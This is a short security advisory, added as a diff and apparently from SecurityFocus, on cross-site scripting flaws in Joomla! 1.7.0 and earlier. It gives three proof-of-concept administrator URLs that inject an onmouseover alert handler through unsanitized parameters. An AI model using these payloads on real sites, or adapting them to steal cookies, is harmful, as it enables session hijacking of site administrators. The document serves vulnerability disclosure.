@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/49853/info
+
+Joomla! is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker could leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This could allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Joomla! 1.7.0 and prior are vulnerable. 
+
+http://example.com/joomla17_noseo/administrator/index.php?option=com_categories&extension=com_content%20%22onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22%20x=%22
+
+
+http://example.com/joomla17_noseo/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=1%22%20onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22x=%22&author=
+
+
+http://example.com/joomla17_noseo/administrator/index.php?option=com_media&view=images&tmpl=component&e_name=jform_articletext&asset=&author=1%22%20onmouseover=%22alert%28/XSS/%29%22style=%22width:3000px!important;height:3000px!important;z-index:999999;position:absolute!important;left:0;top:0;%22x=%22
+
